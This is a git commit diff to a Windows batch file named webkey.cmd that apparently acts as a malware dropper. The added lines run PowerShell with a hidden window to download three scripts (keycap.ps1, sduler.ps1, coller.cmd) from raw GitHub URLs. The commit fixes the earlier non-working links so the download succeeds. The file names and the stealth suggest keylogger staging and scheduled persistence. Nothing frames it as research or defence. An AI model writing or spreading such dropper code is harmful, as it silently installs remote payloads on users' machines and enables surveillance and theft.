e2315843d34d0e16bafb6bfa5003e00ffe3abf1c
gozen-foto <gofoto.zen@proton.me>
2026-06-01 13:01:39 +0530

    Update webkey.cmd

--- paypack/keycap/webkey.cmd
+++ paypack/keycap/webkey.cmd
@@ -1,4 +1,4 @@
 @echo off
-powershell powershell.exe -Windowstyle hidden "Invoke-WebRequest -Uri https://github.com/gozen-foto/zebroy/blob/main/paypack/keycap/keycap.ps1 -OutFile keycap.ps1"
-powershell powershell.exe -Windowstyle hidden "Invoke-WebRequest -Uri https://github.com/gozen-foto/zebroy/blob/main/paypack/keycap/sduler.ps1 -OutFile sduler.ps1"
-powershell powershell.exe -Windowstyle hidden "Invoke-WebRequest -Uri https://github.com/gozen-foto/zebroy/blob/main/paypack/keycap/coller.cmd -OutFile coller.cmd"
+powershell powershell.exe -Windowstyle hidden "Invoke-WebRequest -Uri https://raw.githubusercontent.com/gozen-foto/zebroy/refs/heads/main/paypack/keycap/keycap.ps1 -OutFile keycap.ps1"
+powershell powershell.exe -Windowstyle hidden "Invoke-WebRequest -Uri https://raw.githubusercontent.com/gozen-foto/zebroy/refs/heads/main/paypack/keycap/sduler.ps1 -OutFile sduler.ps1"
+powershell powershell.exe -Windowstyle hidden "Invoke-WebRequest -Uri https://raw.githubusercontent.com/gozen-foto/zebroy/refs/heads/main/paypack/keycap/coller.cmd -OutFile coller.cmd"
